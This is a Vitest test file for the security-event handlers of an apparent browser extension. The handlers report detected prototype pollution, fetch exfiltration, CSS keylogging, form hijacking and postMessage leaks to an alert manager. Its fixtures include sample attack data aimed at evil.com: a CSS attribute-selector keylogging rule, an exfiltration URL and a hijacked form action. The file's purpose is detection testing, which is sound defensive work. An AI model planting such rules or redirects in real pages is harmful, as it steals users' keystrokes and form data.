import { describe, expect, it, vi } from "vitest";
import type { AlertManager } from "../../alerts/index.js";
import { createSecurityEventHandlers } from "./security-event-handlers.js";

function createMockAlertManager(): AlertManager {
  return {
    alertPrototypePollution: vi.fn().mockResolvedValue(null),
    alertDNSPrefetchLeak: vi.fn().mockResolvedValue(null),
    alertFormHijack: vi.fn().mockResolvedValue(null),
    alertCSSKeylogging: vi.fn().mockResolvedValue(null),
    alertPostMessageExfil: vi.fn().mockResolvedValue(null),
    alertCacheAPIAbuse: vi.fn().mockResolvedValue(null),
    alertFetchExfiltration: vi.fn().mockResolvedValue(null),
    alertWASMExecution: vi.fn().mockResolvedValue(null),
    alertDataExfiltration: vi.fn().mockResolvedValue(null),
    alertCredentialTheft: vi.fn().mockResolvedValue(null),
    alertSupplyChainRisk: vi.fn().mockResolvedValue(null),
    alertTrackingBeacon: vi.fn().mockResolvedValue(null),
    alertClipboardHijack: vi.fn().mockResolvedValue(null),
    alertXSSInjection: vi.fn().mockResolvedValue(null),
    alertDOMScraping: vi.fn().mockResolvedValue(null),
    alertSuspiciousDownload: vi.fn().mockResolvedValue(null),
    alertWebSocketConnection: vi.fn().mockResolvedValue(null),
    alertDynamicCodeExecution: vi.fn().mockResolvedValue(null),
    alertFullscreenPhishing: vi.fn().mockResolvedValue(null),
    alertClipboardRead: vi.fn().mockResolvedValue(null),
    alertGeolocationAccess: vi.fn().mockResolvedValue(null),
    alertCanvasFingerprint: vi.fn().mockResolvedValue(null),
    alertWebGLFingerprint: vi.fn().mockResolvedValue(null),
    alertAudioFingerprint: vi.fn().mockResolvedValue(null),
    alertBroadcastChannel: vi.fn().mockResolvedValue(null),
    alertWebRTCConnection: vi.fn().mockResolvedValue(null),
    alertSendBeacon: vi.fn().mockResolvedValue(null),
    alertMediaCapture: vi.fn().mockResolvedValue(null),
    alertNotificationPhishing: vi.fn().mockResolvedValue(null),
    alertCredentialAPI: vi.fn().mockResolvedValue(null),
    alertDeviceSensor: vi.fn().mockResolvedValue(null),
    alertDeviceEnumeration: vi.fn().mockResolvedValue(null),
    alertStorageExfiltration: vi.fn().mockResolvedValue(null),

    alertPerformanceObserver: vi.fn().mockResolvedValue(null),
    alertDOMClobbering: vi.fn().mockResolvedValue(null),
    alertIntersectionObserver: vi.fn().mockResolvedValue(null),
    alertIndexedDBAbuse: vi.fn().mockResolvedValue(null),
    alertHistoryManipulation: vi.fn().mockResolvedValue(null),
    alertMessageChannel: vi.fn().mockResolvedValue(null),
    alertResizeObserver: vi.fn().mockResolvedValue(null),
    alertExecCommandClipboard: vi.fn().mockResolvedValue(null),
    alertEventSourceChannel: vi.fn().mockResolvedValue(null),
    alertFontFingerprint: vi.fn().mockResolvedValue(null),
    alertIdleCallbackTiming: vi.fn().mockResolvedValue(null),
  } as unknown as AlertManager;
}

function createHandlers(alertManager: AlertManager) {
  return createSecurityEventHandlers({
    getAlertManager: () => alertManager,
    extractDomainFromUrl: (url: string) => {
      try {
        return new URL(url).hostname;
      } catch {
        return url;
      }
    },
    checkDataTransferPolicy: vi.fn().mockResolvedValue(undefined),
    logger: { debug: vi.fn(), warn: vi.fn() },
  });
}

function makeSender(tabUrl?: string): chrome.runtime.MessageSender {
  return {
    tab: tabUrl ? { url: tabUrl } : undefined,
  } as chrome.runtime.MessageSender;
}

describe("handlePrototypePollution", () => {
  it("正常なデータでalertPrototypePollutionを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handlePrototypePollution(
      {
        target: "Object.prototype",
        property: "__proto__",
        method: "defineProperty",
        timestamp: 1700000000000,
        pageUrl: "https://example.com/page",
      },
      makeSender("https://example.com/page"),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertPrototypePollution).toHaveBeenCalledTimes(1);
    expect(alertManager.alertPrototypePollution).toHaveBeenCalledWith({
      domain: "example.com",
      target: "Object.prototype",
      property: "__proto__",
      method: "defineProperty",
    }, "https://example.com/page");
  });

  it("sender.tab.urlからdomainを取得する", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    await handlers.handlePrototypePollution(
      { pageUrl: "https://other.com/page" },
      makeSender("https://tab.example.com/page"),
    );

    expect(alertManager.alertPrototypePollution).toHaveBeenCalledWith(
      expect.objectContaining({ domain: "tab.example.com" }),
      "https://tab.example.com/page",
    );
  });

  it("データが欠落していてもデフォルト値でアラートを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handlePrototypePollution(
      {},
      makeSender(),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertPrototypePollution).toHaveBeenCalledWith(
      expect.objectContaining({
        target: "Object.prototype",
        property: "unknown",
        method: "unknown",
      }),
      "",
    );
  });
});

describe("handleFetchExfiltration", () => {
  it("正常なデータでalertFetchExfiltrationを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleFetchExfiltration(
      {
        url: "https://evil.com/steal",
        mode: "no-cors",
        reason: "cross_origin_no_cors",
        bodySize: 2048,
        timestamp: 1700000000000,
        pageUrl: "https://victim.com/page",
      },
      makeSender("https://victim.com/page"),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertFetchExfiltration).toHaveBeenCalledTimes(1);
    expect(alertManager.alertFetchExfiltration).toHaveBeenCalledWith({
      domain: "victim.com",
      url: "https://evil.com/steal",
      mode: "no-cors",
      reason: "cross_origin_no_cors",
      bodySize: 2048,
    }, "https://victim.com/page");
  });

  it("sender.tab.urlからdomainを取得する", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    await handlers.handleFetchExfiltration(
      { url: "https://evil.com/steal", pageUrl: "https://other.com" },
      makeSender("https://tab.victim.com/page"),
    );

    expect(alertManager.alertFetchExfiltration).toHaveBeenCalledWith(
      expect.objectContaining({ domain: "tab.victim.com" }),
      "https://tab.victim.com/page",
    );
  });

  it("データが欠落していてもデフォルト値でアラートを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleFetchExfiltration(
      {},
      makeSender(),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertFetchExfiltration).toHaveBeenCalledWith(
      expect.objectContaining({
        url: "",
        mode: "cors",
        reason: "cross_origin_no_cors",
      }),
      "",
    );
  });
});

describe("handleCacheAPIAbuse", () => {
  it("正常なデータでalertCacheAPIAbuseを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleCacheAPIAbuse(
      {
        operation: "put",
        cacheName: "v1-cache",
        url: "https://example.com/secret",
        timestamp: 1700000000000,
        pageUrl: "https://example.com/page",
      },
      makeSender("https://example.com/page"),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertCacheAPIAbuse).toHaveBeenCalledTimes(1);
    expect(alertManager.alertCacheAPIAbuse).toHaveBeenCalledWith({
      domain: "example.com",
      operation: "put",
      cacheName: "v1-cache",
      url: "https://example.com/secret",
    }, "https://example.com/page");
  });

  it("sender.tab.urlからdomainを取得する", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    await handlers.handleCacheAPIAbuse(
      { operation: "open", pageUrl: "https://other.com" },
      makeSender("https://tab.example.com/page"),
    );

    expect(alertManager.alertCacheAPIAbuse).toHaveBeenCalledWith(
      expect.objectContaining({ domain: "tab.example.com" }),
      "https://tab.example.com/page",
    );
  });

  it("データが欠落していてもデフォルト値でアラートを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleCacheAPIAbuse(
      {},
      makeSender(),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertCacheAPIAbuse).toHaveBeenCalledWith(
      expect.objectContaining({
        operation: "open",
        cacheName: "",
      }),
      "",
    );
  });
});

describe("handleWASMExecution", () => {
  it("正常なデータでalertWASMExecutionを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleWASMExecution(
      {
        method: "instantiateStreaming",
        byteLength: 65536,
        isBinary: true,
        timestamp: 1700000000000,
        pageUrl: "https://example.com/app",
      },
      makeSender("https://example.com/app"),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertWASMExecution).toHaveBeenCalledTimes(1);
    expect(alertManager.alertWASMExecution).toHaveBeenCalledWith({
      domain: "example.com",
      method: "instantiateStreaming",
      byteLength: 65536,
    }, "https://example.com/app");
  });

  it("sender.tab.urlからdomainを取得する", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    await handlers.handleWASMExecution(
      { pageUrl: "https://other.com" },
      makeSender("https://tab.example.com/app"),
    );

    expect(alertManager.alertWASMExecution).toHaveBeenCalledWith(
      expect.objectContaining({ domain: "tab.example.com" }),
      "https://tab.example.com/app",
    );
  });

  it("データが欠落していてもデフォルト値でアラートを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleWASMExecution(
      {},
      makeSender(),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertWASMExecution).toHaveBeenCalledWith(
      expect.objectContaining({
        method: "instantiate",
        byteLength: null,
      }),
      "",
    );
  });
});

describe("handleCSSKeylogging", () => {
  it("正常なデータでalertCSSKeyloggingを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleCSSKeylogging(
      {
        sampleRule: "input[value='a'] { background: url(https://evil.com/?k=a) }",
        timestamp: 1700000000000,
        pageUrl: "https://example.com/login",
      },
      makeSender("https://example.com/login"),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertCSSKeylogging).toHaveBeenCalledTimes(1);
    expect(alertManager.alertCSSKeylogging).toHaveBeenCalledWith({
      domain: "example.com",
      sampleRule: "input[value='a'] { background: url(https://evil.com/?k=a) }",
    }, "https://example.com/login");
  });

  it("sender.tab.urlからdomainを取得する", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    await handlers.handleCSSKeylogging(
      { pageUrl: "https://other.com" },
      makeSender("https://tab.example.com/login"),
    );

    expect(alertManager.alertCSSKeylogging).toHaveBeenCalledWith(
      expect.objectContaining({ domain: "tab.example.com" }),
      "https://tab.example.com/login",
    );
  });

  it("データが欠落していてもデフォルト値でアラートを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleCSSKeylogging(
      {},
      makeSender(),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertCSSKeylogging).toHaveBeenCalledWith(
      expect.objectContaining({ sampleRule: "" }),
      "",
    );
  });
});

describe("handleDNSPrefetchLeak", () => {
  it("正常なデータでalertDNSPrefetchLeakを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleDNSPrefetchLeak(
      {
        rel: "dns-prefetch",
        href: "https://tracker.example.com",
        timestamp: 1700000000000,
        pageUrl: "https://example.com/page",
      },
      makeSender("https://example.com/page"),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertDNSPrefetchLeak).toHaveBeenCalledTimes(1);
    expect(alertManager.alertDNSPrefetchLeak).toHaveBeenCalledWith({
      domain: "example.com",
      rel: "dns-prefetch",
      href: "https://tracker.example.com",
    }, "https://example.com/page");
  });

  it("sender.tab.urlからdomainを取得する", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    await handlers.handleDNSPrefetchLeak(
      { pageUrl: "https://other.com" },
      makeSender("https://tab.example.com/page"),
    );

    expect(alertManager.alertDNSPrefetchLeak).toHaveBeenCalledWith(
      expect.objectContaining({ domain: "tab.example.com" }),
      "https://tab.example.com/page",
    );
  });

  it("データが欠落していてもデフォルト値でアラートを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleDNSPrefetchLeak(
      {},
      makeSender(),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertDNSPrefetchLeak).toHaveBeenCalledWith(
      expect.objectContaining({
        rel: "dns-prefetch",
        href: "",
      }),
      "",
    );
  });
});

describe("handleFormHijack", () => {
  it("正常なデータでalertFormHijackを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleFormHijack(
      {
        originalAction: "https://example.com/submit",
        newAction: "https://evil.com/steal",
        targetDomain: "evil.com",
        isCrossOrigin: true,
        timestamp: 1700000000000,
        pageUrl: "https://example.com/page",
      },
      makeSender("https://example.com/page"),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertFormHijack).toHaveBeenCalledTimes(1);
    expect(alertManager.alertFormHijack).toHaveBeenCalledWith({
      domain: "example.com",
      originalAction: "https://example.com/submit",
      newAction: "https://evil.com/steal",
      targetDomain: "evil.com",
    }, "https://example.com/page");
  });

  it("sender.tab.urlからdomainを取得する", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    await handlers.handleFormHijack(
      { pageUrl: "https://other.com" },
      makeSender("https://tab.example.com/page"),
    );

    expect(alertManager.alertFormHijack).toHaveBeenCalledWith(
      expect.objectContaining({ domain: "tab.example.com" }),
      "https://tab.example.com/page",
    );
  });

  it("データが欠落していてもデフォルト値でアラートを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handleFormHijack(
      {},
      makeSender(),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertFormHijack).toHaveBeenCalledWith(
      expect.objectContaining({
        originalAction: "",
        newAction: "",
        targetDomain: "",
      }),
      "",
    );
  });
});

describe("handlePostMessageExfil", () => {
  it("正常なデータでalertPostMessageExfilを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handlePostMessageExfil(
      {
        targetOrigin: "https://evil.com",
        timestamp: 1700000000000,
        pageUrl: "https://example.com/page",
      },
      makeSender("https://example.com/page"),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertPostMessageExfil).toHaveBeenCalledTimes(1);
    expect(alertManager.alertPostMessageExfil).toHaveBeenCalledWith({
      domain: "example.com",
      targetOrigin: "https://evil.com",
    }, "https://example.com/page");
  });

  it("sender.tab.urlからdomainを取得する", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    await handlers.handlePostMessageExfil(
      { pageUrl: "https://other.com" },
      makeSender("https://tab.example.com/page"),
    );

    expect(alertManager.alertPostMessageExfil).toHaveBeenCalledWith(
      expect.objectContaining({ domain: "tab.example.com" }),
      "https://tab.example.com/page",
    );
  });

  it("データが欠落していてもデフォルト値でアラートを呼ぶ", async () => {
    const alertManager = createMockAlertManager();
    const handlers = createHandlers(alertManager);

    const result = await handlers.handlePostMessageExfil(
      {},
      makeSender(),
    );

    expect(result.success).toBe(true);
    expect(alertManager.alertPostMessageExfil).toHaveBeenCalledWith(
      expect.objectContaining({ targetOrigin: "" }),
      "",
    );
  });
});
